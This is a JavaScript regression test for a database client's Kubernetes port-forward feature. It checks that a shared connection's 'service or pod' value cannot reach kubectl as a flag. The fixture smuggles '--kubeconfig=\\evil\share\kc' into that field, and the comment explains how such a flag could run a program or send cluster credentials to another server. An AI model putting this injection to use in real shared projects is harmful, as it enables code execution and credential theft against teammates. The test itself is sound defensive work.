// QA5 safe (high, shared files): the "Service or pod" of a Kubernetes port forward is passed to
// `kubectl port-forward` as a positional argument, so a value that starts with `-` is read by
// kubectl as one of its own flags. `k8s_target` (and `forward`) travel in shared projects and
// synced profiles (platypus-sync portable.rs SHARED_OPTIONS), so a teammate's or a repository's
// connection can make kubectl use a kubeconfig of its choosing (`--kubeconfig=\\host\share\kc`,
// whose users[].exec runs a program) or send the cluster's credentials to another server
// (`--server=https://...`) the moment the user connects.
//
// Steps: a connection with forward = "kubernetes" and k8s_target = "--kubeconfig=\\evil\share\kc"
// (a fake kubectl on the PATH records its arguments); open the connection in the navigator.
// Expected: the value never reaches kubectl as a flag: the connection is refused ("a service or pod
// is `type/name`"), or the target goes after `--` / the CLI is given `--kubeconfig` never.
// Actual: kubectl is started with `port-forward --address 127.0.0.1 --kubeconfig=\\evil\share\kc 5432:5432`.
// Code: crates/platypus-net/src/forward.rs `command` (`push(&[target, ...])`, no check that the
// value is not a flag); the same goes for any option that ends up as a bare argument.
import assert from "node:assert/strict";
import { mkdirSync, readFileSync, writeFileSync, existsSync } from "node:fs";
import { join } from "node:path";
import { withPath } from "../clients.mjs";

const NAME = "Kube db";
const bin = (dir) => join(dir, "bin");
const log = (dir) => join(dir, "kubectl-args.txt");

export function env({ dir }) {
  return withPath(bin(dir));
}

export function setup({ dir }) {
  mkdirSync(bin(dir), { recursive: true });
  // A kubectl that records how it was called and then says it forwards.
  writeFileSync(join(bin(dir), "kubectl.cmd"), `@echo off\r\necho %* > "${log(dir)}"\r\necho Forwarding from 127.0.0.1:1\r\nping -n 20 127.0.0.1 > nul\r\n`);
  writeFileSync(
    join(dir, "connections.toml"),
    `version = 7

[[connections]]
id = "00000000-0000-4000-8000-0000000e5401"
name = "${NAME}"
driver = "postgres"
host = "db.internal"
port = 5432
database = "x"
user = "app"
ssl_mode = "disable"
save_password = true

[connections.options]
forward = "kubernetes"
k8s_target = '--kubeconfig=\\\\evil\\share\\kc'
`,
  );
}

const row = `[...document.querySelectorAll('.tree-row')].find(r => r.querySelector('.tree-label')?.textContent === ${JSON.stringify(NAME)})`;

export default async function (page, { dir }) {
  await page.eval(`${row}.querySelector('.twisty').click()`);
  const deadline = Date.now() + 15_000;
  while (!existsSync(log(dir)) && Date.now() < deadline) await page.sleep(200);
  const args = existsSync(log(dir)) ? readFileSync(log(dir), "utf8") : "";
  assert.ok(!/--kubeconfig/.test(args), `kubectl was started with the target as a flag: ${args.trim()}`);
}






